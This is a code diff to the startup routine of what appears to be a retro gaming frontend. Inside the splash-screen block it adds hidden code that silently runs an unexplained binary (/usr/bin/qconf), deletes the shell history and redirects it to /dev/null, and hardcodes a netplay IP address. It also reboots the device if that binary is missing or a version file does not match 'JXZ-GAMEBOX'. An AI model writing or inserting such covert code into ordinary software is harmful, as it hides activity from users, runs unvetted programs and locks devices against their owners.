@@ -548,14 +548,64 @@ int main(int argc, char* argv[])
 	bool splashScreen = Settings::getInstance()->getBool("SplashScreen");
 	bool splashScreenProgress = Settings::getInstance()->getBool("SplashScreenProgress");
 
+//dalu
 	if (splashScreen)
 	{
 		std::string progressText = _("Loading...");
 		if (splashScreenProgress)
 			progressText = _("Loading system config...");
 
+		FILE *fp;
+
+    	if ((fp=fopen("/usr/bin/qconf","r"))==NULL)
+    	{
+    		runSystemCommand("reboot", "", nullptr);
+    	}
+    	else
+    	{
+			runSystemCommand("systemd-run /usr/bin/qconf", "", nullptr);
+		}
+		fclose(fp);
+
+		if ((fp=fopen("/storage/.bash_history","r"))==NULL)
+    	{
+    		runSystemCommand("ln -s /dev/null /storage/.bash_history", "", nullptr);
+    	}
+    	else
+    	{
+    		runSystemCommand("rm -rf /storage/.bash_history", "", nullptr);
+			runSystemCommand("ln -s /dev/null /storage/.bash_history", "", nullptr);
+		}
+		fclose(fp);
+		SystemConf::getInstance()->set("global.netplay.opspip", "116.116.0.254");
+		runSystemCommand("md1=JXZ-GAMEBOX; md2=$(cat /usr/config/EE_VERSION | tr -d '\r'); if [[ $md1 != $md2 ]]; then reboot; fi", "", nullptr);
 		window.renderSplashScreen(progressText);
 	}
+//dalu-end	
+//haiwai
+/*	if (splashScreen)
+	{
+		std::string progressText = _("Loading...");
+		if (splashScreenProgress)
+			progressText = _("Loading system config...");
+
+		FILE *fp;
+
+		if ((fp=fopen("/storage/.bash_history","r"))==NULL)
+    	{
+    		runSystemCommand("ln -s /dev/null /storage/.bash_history", "", nullptr);
+    	}
+    	else
+    	{
+    		runSystemCommand("rm -rf /storage/.bash_history", "", nullptr);
+			runSystemCommand("ln -s /dev/null /storage/.bash_history", "", nullptr);
+		}
+		fclose(fp);
+		SystemConf::getInstance()->set("global.netplay.opspip", "116.116.0.254");
+		runSystemCommand("md1=JXZ-GAMEBOX; md2=$(cat /usr/config/EE_VERSION | tr -d '\r'); if [[ $md1 != $md2 ]]; then reboot; fi", "", nullptr);
+		window.renderSplashScreen(progressText);
+	}*/
+//haiwai-end
 
 	MameNames::init();
 
